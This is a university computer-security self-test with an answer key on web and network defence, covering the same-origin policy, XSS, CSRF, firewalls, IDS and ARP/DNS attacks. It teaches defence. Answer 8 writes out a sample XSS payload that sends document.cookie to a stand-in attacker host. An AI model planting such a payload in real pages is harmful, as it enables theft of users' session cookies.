---
tags:
  - university
  - bcs2420
  - computer-security
  - self-test
---

# 05 Web and Network Defense Self Test

Answer these without checking the notes. Then expand the Answer Key callout at the bottom to grade yourself.

## Web Architecture, HTTP, Cookies, and the Browser Security Model

1. What is the Same-Origin Policy? Which three components does it compare?
2. Why are cookies critical to web authentication?
3. Why can DevTools reveal hidden or client-side paywalled content?

## Mixed Content, document.domain, and Cookie Scope Across Subdomains

4. Why is mixed content dangerous on an HTTPS page?
5. What does `document.domain` do?
6. What are the risks of setting a cookie for `.example.com` instead of `app.example.com`?

## XSS, CSRF, SQL Injection, and Session Defenses

7. What is the difference between **reflected** and **stored** XSS? (Past exam topic — be specific about who the victim is and where the payload lives.)
8. Why do HttpOnly cookies help against some XSS attacks?
9. How does CSRF work? Why is it different from XSS?
10. Why are prepared statements better than manual string concatenation for SQL?

## Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs

11. Why are stateful firewalls often better than stateless ones for return traffic?
12. What is a DMZ for?
13. How does SSH local port forwarding improve confidentiality for an insecure protocol?
14. What does tunnel mode VPN protect?

## Firewall Policy Design, Bastion Hosts, and Port Knocking

15. Compare **default-allow** and **default-deny** policies — focus on the failure mode of each.
16. What is a bastion host?
17. Why might port knocking be used with a firewall? What does it not replace?

## IDS, IPS, HIDS, NIDS, and Detection Models

18. What is the difference between IDS and IPS?
19. What is the base-rate problem in intrusion detection?
20. Why can anomaly-based systems have many false positives?
21. What does a HIDS monitor that a NIDS may not see directly?

## Packet Sniffing, Promiscuous Mode, Switched LANs, and NIDS Visibility

22. Why is packet sniffing harder on a switched LAN than on a hub?
23. What does promiscuous mode do, and what does it **not** do?
24. Why does NIDS placement matter?

## DDoS, Alarm Quality, and Detection Interpretation

25. What is a false negative? Why is it operationally dangerous?
26. Why can most alarms be false even if the detector's false-positive rate is low?
27. How can a DDoS and a flash crowd be difficult to distinguish at first glance?

## ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection

28. How does ARP spoofing work? What is its scope?
29. How does DNS cache poisoning redirect users? Name two mitigations.
30. Why are switched LANs relevant to packet observation in network attacks?

## MITM Scenario Recognition (past exam pattern)

31. An attacker intercepts the key-exchange messages between Alice and Bob and substitutes their own public keys. Which **layer** of MITM is this, and what is the single defence?
32. A user connects to a coffee-shop Wi-Fi network with the same SSID as a legitimate hotspot. The attacker relays all traffic to the real AP. Name the attack and the wireless feature that makes it possible.

> [!info]- Answer Key
> 1. SOP restricts how scripts from one origin interact with data from another. It compares the triple **scheme + host + port**. Two pages sharing only a top-level domain but differing in any of these three are NOT same-origin.
> 2. HTTP is stateless but authenticated sessions need continuity. Cookies are stored by the browser and automatically reattached to matching requests, carrying the session identifier that links a request to an authenticated user. This convenience is also what enables CSRF.
> 3. Anything the browser renders has already been delivered to the client. If a "paywalled" article body is in the DOM and only hidden by CSS (display:none, an overlay), DevTools → Elements can remove the overlay and reveal the text. Server-side enforcement is the only real access control; client-side hiding is decoration.
> 4. HTTPS only protects the page as long as its dependent resources are also protected. An HTTP script subresource can be tampered with in transit by a network attacker, who then injects arbitrary JS into the "secure" page — undermining its integrity. Modern browsers block active mixed content for this reason.
> 5. It is a browser mechanism that lets related subdomains relax SOP by aligning to a shared parent (e.g., `a.example.com` and `b.example.com` both setting `document.domain = "example.com"`). Widens the trust boundary — any weakness in either participating subdomain reaches the other.
> 6. A cookie scoped to `.example.com` is sent to every subdomain. A weaker or compromised subdomain (e.g., `blog.example.com` with XSS) can then read or use the session cookie intended for `app.example.com`, becoming a stepping stone into the main session space.
> 7. **Reflected XSS**: payload is in a request (URL parameter, form field) and immediately reflected back in the server's response without persistence. Victim must be lured into the specific crafted request (phishing link). Only the user who makes that request is affected. **Stored XSS**: payload is saved by the application (e.g., in a comment, profile, or post) and served to every later viewer of the affected page. Fire-and-forget for the attacker; persists across many victims. The defining contrast is persistence + victim multiplicity.
> 8. HttpOnly cookies cannot be read by client-side JavaScript (`document.cookie` does not see them). So an XSS payload that injects script to exfiltrate the session cookie via `fetch('attacker.com?c='+document.cookie)` fails for HttpOnly cookies. (XSS can still perform actions in the user's session by issuing same-origin requests, but it cannot steal the cookie itself.)
> 9. CSRF: the victim is authenticated to site A. The attacker tricks the victim's browser (via a link or auto-loaded form on attacker.com) into sending a request to site A. Because cookies are attached automatically, site A treats the request as legitimate. CSRF does NOT require executing script on site A — only causing the victim's browser to send a request. Differs from XSS, which actually executes attacker code in site A's origin. Defences: anti-CSRF tokens, SameSite cookies, re-authentication for sensitive actions.
> 10. Prepared statements send SQL **structure** and **parameter values** to the database on separate channels. The driver never re-parses the parameter as SQL, so it cannot break out into syntax — injection is structurally impossible. Manual escaping is fragile: multi-byte charset ambiguity, different DBs quote differently, numeric/identifier contexts have no quoting at all. Rule: separate code from data.
> 11. Stateful firewalls track connection state — they can recognise that an inbound packet is a legitimate response to an outbound request and let it through, while rejecting unsolicited inbound traffic on the same port. Stateless firewalls evaluate each packet in isolation and must either open the port both ways or block return traffic, both of which are coarser and less secure.
> 12. A DMZ (demilitarised zone) is a network segment between the public Internet and the internal network where public-facing services (web, DNS, mail) live. Two firewalls sit between Internet→DMZ and DMZ→internal. A compromise of a DMZ service does not directly reach the internal network because a second filter sits in the way — isolated compartments.
> 13. `ssh -L 8080:internal.example:80 user@gateway` makes local port 8080 a tunnel into the remote service via the encrypted SSH session. The plaintext application protocol (HTTP, IMAP, etc.) is wrapped inside the SSH channel for transit, so an on-path attacker sees only the encrypted SSH stream, not the application payload.
> 14. Tunnel-mode VPN encapsulates the **entire IP packet** (original IP header + payload) inside a new outer packet, typically encrypted and authenticated. Protects the inner addresses and payload from observation/tampering between the VPN endpoints. Used for gateway-to-gateway site connectivity (vs transport mode which encrypts payload but leaves the original IP header visible).
> 15. **Default-deny**: nothing is allowed unless an explicit rule permits it. Failure mode = **service breakage** (loud, visible, recoverable — admin files a ticket and adds a rule). **Default-allow**: everything is allowed unless an explicit rule blocks it. Failure mode = **silent unauthorised access** (invisible, undetected, unrecoverable once exploited). Default-deny is safer because its failure mode is visible; default-allow's failure mode is silent — this is the SAFE-DEFAULTS principle.
> 16. A bastion host is a deliberately hardened, deliberately exposed system at a network boundary that accepts external interaction in a controlled way. Non-essential services are disabled to minimise attack surface; all external access to internal systems is funnelled through it so exposure is narrowed to one defensible component.
> 17. Port knocking hides a service until the client presents a secret sequence of connection attempts to specific closed ports; only then does the firewall open the real service port. It reduces opportunistic scanning visibility (a port scan sees nothing). It is **not** authentication — anyone observing the knock sequence can replay it, and it does not encrypt or authenticate the traffic that follows. Use it as a stealth aid alongside real auth + encryption, not as a substitute.
> 18. IDS detects and alerts; IPS detects and can actively block/respond (drop traffic, change config, kill connection). IPS introduces response power and the corresponding risk of automated mistakes — a false positive in an IPS may block legitimate traffic.
> 19. Even with a low false-positive rate, if real attacks are rare, the absolute number of false alarms can vastly exceed true positives. With a 1% FPR on 1,000,000 events and only 100 real attacks, you get 10,000 false alarms vs 100 true — most alerts are false. Operational implication: raw FPR is not enough; prevalence must be considered.
> 20. Anomaly-based systems flag deviations from a model of "normal" behaviour. Normal behaviour is hard to model perfectly — legitimate variability (new users, software updates, seasonal traffic) looks anomalous. The flexibility that lets anomaly detection catch novel attacks is the same flexibility that produces noise.
> 21. HIDS sees host-local events: file integrity changes, modified registry keys, kernel-level activity, local log entries, in-process behaviour. NIDS sees network packets only — it cannot see what happens inside a host between syscalls and disk, especially if the traffic is encrypted end-to-end or never crosses the monitored segment.
> 22. Hubs flood every frame to every port — a sniffer on any port sees everything. Switches forward frames only to the destination port based on MAC tables, so a sniffer on an unrelated port sees only broadcasts and its own traffic. Visibility on a switched LAN requires a mirror/SPAN port, a network tap, or being placed on the gateway.
> 23. Promiscuous mode tells the NIC to accept and pass to software all frames it observes, not only those addressed to its own MAC. It does **not** make a switch forward unrelated frames — if the switch never sends a frame to the sensor port, the NIC has nothing to capture regardless of mode. It captures available traffic; it does not create traffic that isn't there.
> 24. The NIDS can only inspect what it can see. On a switched LAN, sensor placement (mirror port, tap, gateway) decides which traffic is observed. Bad placement means whole conversations may be invisible; defenders may then misread silence as "no attack" when it really means "no visibility".
> 25. A real intrusion or attack that the detector **fails to flag**. Operationally dangerous because the attack proceeds unnoticed — no alert is raised, no response is triggered, and the analyst has no reason to investigate. False negatives are quieter than false positives but often more damaging.
> 26. Base-rate problem. If real attacks are very rare in the event stream (low prior), even a small false-positive rate over many benign events produces far more false alarms than the (few) true positives. Bayes' rule: P(attack | alarm) depends on prevalence, not just on the detector's raw rates.
> 27. Both look like a large volume of requests/traffic from many distinct sources hitting a service simultaneously. Flash crowds (legitimate sudden interest — a viral link, a launch) have similar surface patterns. Distinguishing requires deeper analysis: client-behaviour distribution, geographic spread, request semantics, whether traffic is well-formed and matches normal interaction patterns.
> 28. ARP maps IP to MAC on a local segment and has no authentication. The attacker sends forged ARP replies binding the gateway's IP to the attacker's MAC. Victims cache the false mapping and send traffic intended for the gateway to the attacker, who forwards it on (LAN MITM). Scope: local subnet only — ARP does not cross routers.
> 29. The attacker races to send a forged DNS response that matches the legitimate query's transaction ID and source port before the real reply arrives; the false name→IP mapping is then cached and returned to every subsequent client for that domain. Mitigations: **source-port randomisation** (+entropy), **transaction-ID randomisation**, **0x20 case randomisation**, and **DNSSEC** (cryptographic signatures — the only countermeasure that defeats the attack outright).
> 30. Many sniffing-dependent attacks (passive eavesdropping, session-cookie capture) require the attacker to see the victim's traffic. On a switched LAN that visibility is not automatic — the attacker often pairs the sniff with ARP spoofing to redirect traffic to their port first. Topology shapes what passive observation is even possible.
> 31. **Transport-layer MITM via key-exchange substitution**. The attacker intercepts each party's public DH value and substitutes their own, ending up with one shared key with Alice and a different one with Bob, decrypting and re-encrypting every message. Single defence: **authenticated key exchange** — sign each ephemeral public value with a long-term identity key (or use certificates) so substitution fails verification.
> 32. **Rogue AP** at the wireless link layer. Possible because the original 802.11 standard does not require mutual authentication of the AP to the station — the STA associates with any AP advertising a matching SSID/security policy. The rogue AP then relays to the real AP, completing the MITM.
